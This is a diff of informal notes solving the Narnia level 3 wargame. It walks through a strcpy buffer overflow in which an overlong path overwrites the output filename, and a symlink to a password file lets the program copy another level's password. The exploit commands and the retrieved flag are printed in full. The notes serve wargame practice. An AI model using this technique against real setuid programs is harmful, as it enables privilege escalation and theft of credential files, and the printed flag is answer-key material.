@@ -1,0 +1,31 @@
+ int  ifd,  ofd;
+ char ofile[16] = "/dev/null";
+ char ifile[32];
+ char buf[32];
+ifile and buff have size of 32 but ofile only has size of 16: potential overflow?
+
+ strcpy(ifile, argv[1]);
+
+strcpy() is used, if argv[1] > than size of ifile, which is 32, then there will be an overflow
+
+so essentially this program copies the content of this file to another file, we can exploit this.
+
+argv[1] only has size of 32.
+create a dir inside /tmp:
+cd /tmp
+mkdir $(python -c 'print("X"*27)')
+/tmp/XXXXXXXXXXXXXXXXXXXXXXXXXXX is a string of 32 bytes
+cd here and make a symlink that links to the password of narnia4:
+ln -s /etc/narnia_pass/narnia4 flaggg
+
+now we have a symlink called flaggg inside /tmp/XXX.../
+
+aight now we gotta create an empty file just outside XXX/;
+touch /tmp/flaggg
+
+run narnia3: /narnia/narnia3 $(python -c 'print("/tmp/"+"X"*27+"/tmp/flaggg")')
+
+this will copy the content of the the symlink to narnia4, to /tmp/flaggg
+cat /tmp/flaggg
+
+flag retrieved: thaenohtai
